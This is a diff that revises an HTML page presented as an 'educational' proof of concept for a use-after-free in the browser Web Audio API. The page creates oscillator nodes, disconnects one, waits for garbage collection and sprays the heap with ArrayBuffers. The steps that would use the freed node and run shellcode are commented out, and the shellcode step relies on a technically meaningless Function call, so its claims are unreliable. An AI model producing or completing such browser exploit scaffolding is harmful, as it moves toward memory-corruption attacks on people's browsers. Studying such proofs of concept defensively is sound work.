@@ -2,7 +2,12 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Web Audio PoC</title>
+    <title>Web Audio UAF PoC</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        #log { white-space: pre-wrap; border: 1px solid #ccc; padding: 10px; }
+        button { padding: 10px 20px; font-size: 16px; }
+    </style>
 </head>
 <body>
     <h1>Web Audio API UAF PoC (Educational Only)</h1>
@@ -11,39 +16,51 @@
     <div id="log"></div>
 
     <script>
+        let audioCtx = null;
+
         function log(msg) {
-            document.getElementById('log').innerText += msg + '\n';
+            const logDiv = document.getElementById('log');
+            logDiv.innerText += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
+            logDiv.scrollTop = logDiv.scrollHeight;
         }
 
         async function triggerUAF() {
             try {
-                log('Starting Web Audio API PoC...');
+                log('Initializing Web Audio API PoC...');
 
-                // Initialize AudioContext
-                const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                // Step 1: Create or resume AudioContext
+                if (!audioCtx) {
+                    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                    log('AudioContext created.');
+                }
+                if (audioCtx.state === 'suspended') {
+                    await audioCtx.resume();
+                    log('AudioContext resumed after user gesture.');
+                }
+
+                // Step 2: Create oscillator nodes
                 let nodes = [];
-
-                // Step 1: Create many oscillator nodes to stress memory
                 log('Creating 1000 oscillator nodes...');
                 for (let i = 0; i < 1000; i++) {
-                    let node = ctx.createOscillator();
-                    node.connect(ctx.destination);
+                    let node = audioCtx.createOscillator();
+                    node.connect(audioCtx.destination);
                     nodes.push(node);
                 }
 
-                // Step 2: Select and disconnect a target node
+                // Step 3: Disconnect target node
                 let target = nodes[500];
                 log('Disconnecting target node...');
                 target.disconnect();
 
-                // Step 3: Clear array to encourage garbage collection
+                // Step 4: Clear array to encourage GC
                 log('Clearing nodes array...');
                 nodes = null;
 
-                // Step 4: Force GC (browser-dependent, may not work in production)
+                // Step 5: Delay for GC (browser-dependent)
+                log('Waiting for garbage collection...');
                 await new Promise(resolve => setTimeout(resolve, 100));
 
-                // Step 5: Heap spray to control freed memory
+                // Step 6: Heap spray
                 log('Spraying heap with ArrayBuffers...');
                 let spray = [];
                 for (let i = 0; i < 10000; i++) {
@@ -51,10 +68,6 @@
                     buf.fill(0x41414141); // 'AAAA' for debugging
                     spray.push(buf);
                 }
-
-                // Step 6: Access freed node to trigger UAF (disabled for safety)
-                log('Attempting to access freed node (disabled)...');
-                // target.connect(ctx.destination); // Uncommenting may crash vulnerable browsers
 
                 // Step 7: Browser-specific tweaks
                 if (navigator.userAgent.includes('Firefox')) {
@@ -65,20 +78,23 @@
                     await new Promise(resolve => setTimeout(resolve, 200));
                 }
 
-                // Step 8: Placeholder for payload (disabled)
-                log('Payload delivery skipped for safety.');
-                // let shellcode = new Uint8Array([0x90, 0x90, ...]); // Example shellcode
-                // let exec = new Function(shellcode); // Would execute if enabled
-                // exec();
+                // Step 8: Access freed node (disabled for safety)
+                log('Attempting to access freed node (disabled)...');
+                // target.connect(audioCtx.destination); // Would trigger UAF if enabled
 
-                log('PoC completed. Check browser console for details.');
+                // Step 9: Placeholder for payload (disabled)
+                log('Payload delivery skipped for safety.');
+                // let shellcode = new Uint8Array([0x90, 0x90, ...]); // Example
+                // let exec = new Function(shellcode); // Would execute if enabled
+
+                log('PoC completed. Check console for details.');
             } catch (e) {
                 log('Error: ' + e.message);
             }
         }
 
         function runExploit() {
-            log('Initializing exploit...');
+            log('Exploit triggered by user gesture...');
             triggerUAF();
         }
     </script>
